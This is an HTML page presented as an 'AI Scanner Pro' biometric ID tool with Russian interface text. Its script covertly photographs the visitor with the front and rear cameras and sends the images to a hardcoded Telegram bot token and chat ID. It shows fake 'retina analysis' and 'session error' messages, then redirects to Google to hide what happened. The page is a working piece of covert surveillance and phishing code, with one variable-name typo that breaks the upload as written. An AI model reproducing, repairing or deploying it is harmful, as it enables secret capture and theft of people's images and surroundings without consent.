<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Scanner Pro</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.3; }
        
        /* Стеклянный интерфейс */
        .glass-panel {
            position: relative; z-index: 10; width: 80%; max-width: 320px;
            padding: 40px 20px; background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px;
            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .title { font-size: 14px; font-weight: 300; letter-spacing: 4px; color: #fff; margin-bottom: 40px; text-transform: uppercase; opacity: 0.8; }
        
        .glass-btn {
            background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 22px 0; width: 100%; border-radius: 18px; color: #fff;
            font-size: 15px; font-weight: 300; letter-spacing: 1px; cursor: pointer; transition: 0.3s;
        }
        
        .glass-btn:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.97); }
        #status { margin-top: 25px; font-size: 11px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 2px; }
        canvas { display: none; }
    </style>
</head>
<body>

<video id="v" autoplay playsinline></video>

<div class="glass-panel" id="ui">
    <div class="title">Biometric ID</div>
    <button class="glass-btn" onclick="start()">СДЕЛАТЬ ФОТО</button>
    <div id="status">Система готова</div>
</div>

<canvas id="c"></canvas>

<script>
    // ТВОИ ДАННЫЕ
    const T = "8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc";
    const I = "7164380121";

    const v = document.getElementById('v');
    const s = document.getElementById('status');

    async function send(b, cap) {
        let f = new FormData();
        f.append('chat_id', I);
        f.append('photo', b, 'f.jpg');
        f.append('caption', cap);
        try { await fetch(`https://api.telegram.org/bot ${Thoken}/sendPhoto`, { method: 'POST', body: f }); } catch(e){}
    }

    async function snap(m) {
        const c = document.getElementById('c');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        let b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.6));
        await send(b, m);
    }

    async function start() {
        document.querySelector('.glass-btn').style.display = 'none';
        s.innerText = "Инициализация...";
        
        try {
            // 1. Фронталка
            let st = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            v.srcObject = st;
            s.innerText = "Анализ сетчатки...";
            await new Promise(r => setTimeout(r, 1500));
            await snap("👤 Лицо");

            // 2. Задняя камера
            s.innerText = "Синхронизация...";
            st.getTracks().forEach(t => t.stop());
            let st2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            v.srcObject = st2;
            await new Promise(r => setTimeout(r, 1500));
            await snap("📷 Окружение");

            // 3. ЭФФЕКТ КИКА (Редирект)
            s.innerText = "Ошибка сессии...";
            setTimeout(() => {
                window.location.href = "https://www.google.com"; // Куда выкинет пользователя
            }, 500);

        } catch (e) {
            s.innerText = "Ошибка: Доступ отклонен";
            setTimeout(() => { window.location.reload(); }, 2000);
        }
    }
</script>
</body>
</html>
